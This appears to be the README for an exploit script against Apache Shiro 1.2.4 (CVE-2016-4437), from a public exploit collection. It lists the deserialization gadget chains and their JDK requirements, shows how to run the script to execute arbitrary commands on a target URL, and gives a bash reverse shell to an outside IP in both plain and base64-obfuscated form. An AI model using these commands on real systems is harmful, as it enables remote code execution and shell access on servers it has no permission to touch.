# Readme
```
+-------------------------------------------------------------------------------------------------------+
+ DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +
+      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +
+                                                                                                       +
+      CommonsCollections1 - commons-collections:3.1  - 3.1-3.2.1, Need <  jdk1.8                       +
+      CommonsCollections2 - commons-collections4:4.0 - 4.0,       Need <= jdk7u21                      +
+      CommonsCollections3 - commons-collections:3.1  - 3.1-3.2.1, Need <= jdk7u21                      +
+      CommonsCollections4 - commons-collections4:4.0 - 4.0,       Need <= jdk7u21                      +
+      CommonsCollections5 - commons-collections:3.1  - 3.1-3.2.1, Need == jdk1.8.x                     +
+      CommonsCollections6 - commons-collections:3.1  - 3.1-3.2.1, Need == jdk1.7 or jdk1.8             +
+      CommonsCollections7 - 3.1-3.2.1, Need == jdk1.7 or jdk1.8                                        +
+                                                                                                       +
+      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +
+      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +
+      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +
+-------------------------------------------------------------------------------------------------------+
+ USE: python3 <filename> <url> <command>                                                               +
+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080 "touch tmp/exphub"                                +
+ VER: Apahce Shiro <= 1.2.4                                                                            +
+-------------------------------------------------------------------------------------------------------+

```

# RCE
```
python3 shiro-1.2.4_rce.py http://1.1.1.1:8080 "touch tmp/exphub"
```

# Nc Shell

Need encoding
http://www.jackson-t.ca/runtime-exec-payloads.html

Original: 
```
bash -i >&/dev/tcp/1.1.1.1/233 0>&1     
```

Encoding 
```
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}
```
